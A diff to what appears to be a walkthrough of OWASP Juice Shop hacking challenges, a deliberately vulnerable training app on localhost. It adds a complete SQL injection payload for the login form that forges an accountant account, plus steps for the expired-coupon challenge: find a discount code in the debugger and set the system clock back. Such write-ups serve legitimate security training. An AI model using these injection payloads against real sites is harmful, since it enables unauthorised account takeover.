@@ -273,8 +273,12 @@ POST /api/BasketItems/ HTTP/1.1
 {"ProductId":24,"BasketId":"10","quantity":1}
 
 
-Ephemeral Accountant
+### Ephemeral Accountant
 http://localhost:3000/#/login <br>
 burp suite > proxy > repeater <br>
 {"email":"' UNION SELECT * FROM (SELECT 15 as 'id', '' as 'username', 'acc0unt4nt@juice-sh.op' as 'email', '12345' as 'password', 'accounting' as 'role', '123' as 'deluxeToken', '1.2.3.4' as 'lastLoginIp' , '/assets/public/images/uploads/default.svg' as 'profileImage','' as 'totpSecret', 1 as 'isActive','1999-08-16 14:14:41.644 +00:00' as 'createdAt','1999-08-16 14:33:41.930 +00:00' as 'updatedAt',null as 'deletedAt')--","password":""} <br>
 
+### Expired Coupon
+firefox > Debugger<br>
+search: discount > WMNSDY2023<br>
+bash > timedatectl set-ntp 0 > timedatectl set-time '2019-03-08' <br>
